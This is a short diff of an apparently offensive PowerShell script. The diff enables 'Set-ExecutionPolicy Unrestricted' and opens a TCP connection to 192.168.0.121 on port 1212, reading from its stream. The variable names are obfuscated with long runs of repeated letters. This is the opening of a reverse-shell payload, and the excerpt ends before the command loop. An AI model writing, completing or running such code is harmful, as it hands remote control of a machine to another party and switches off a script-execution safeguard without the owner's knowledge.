@@ -1,4 +1,4 @@
-##Set-ExecutionPolicy Unrestricted
+Set-ExecutionPolicy Unrestricted
 $bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb = New-Object Net.Sockets.TCPClient('192.168.0.121', '1212');
 $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = $bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.GetStream();
 $ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc = New-Object IO.StreamReader($aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa);
